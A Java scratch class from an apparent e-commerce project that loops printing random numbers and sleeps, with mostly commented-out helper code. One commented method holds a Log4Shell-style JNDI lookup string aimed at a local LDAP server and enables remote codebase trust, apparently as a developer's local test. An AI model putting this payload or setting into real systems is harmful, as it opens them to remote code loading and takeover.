package com.fresh.utils;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.lang.copier.Copier;
import com.fresh.en.MEnum;
import com.fresh.entity.Users;
import lombok.extern.log4j.Log4j;
import org.apache.commons.lang3.RandomUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.time.DateFormatUtils;
import org.apache.commons.lang3.time.DateUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.springframework.util.IdGenerator;
import org.springframework.util.NumberUtils;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Parameter;
import java.lang.reflect.Type;
import java.math.BigDecimal;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.UUID;
import java.util.concurrent.TimeUnit;


public class MainClass4 {

    private final static SimpleDateFormat format = new SimpleDateFormat("YYYYMMddHHmmss");

    private final static String patter = "YYYYMMddHHmmss";

    private final static Logger log = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) throws NoSuchMethodException, InterruptedException {
        int j = 0;
        while (true) {
            int i = RandomUtils.nextInt(0, 5);
            System.out.println(i);
//            TimeUnit.MICROSECONDS.sleep(RandomUtils.nextInt(500, 4000));
            int timeout = RandomUtils.nextInt(500, 2000);
            System.out.println(timeout);
            TimeUnit.MILLISECONDS.sleep(timeout);
            if (j++ > 10) break;
        }
    }

    public void tMethod(String age) {
        System.out.println(age);
    }

    //
//    private static String getStr() {
//        return UUID.randomUUID().toString();
//    }
//
//
//    private static void extracted() {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//        log.error("");
//        log.error("${jndi:ldap://127.0.0.1:1389/log4jTest}");
//    }
//
//    private static String extractValue(String str) {
//        String substring = str.substring(str.indexOf("${")+2,str.indexOf("}"));
//        return substring;
//    }
//
//    /**
//     * 生成订单号
//     * @return
//     */
//    public static String generateSN() {
//        Date now = new Date();
//        String format = DateFormatUtils.format(now, patter);
//        int stuff = RandomUtils.nextInt(1000, 9999);
//        return format + "" + stuff;
//    }
//
//
    @MiniCatch(value = "${id}")
    private static String localGet(String id, String id2) {
        return id + "" + id2;
    }
//


}
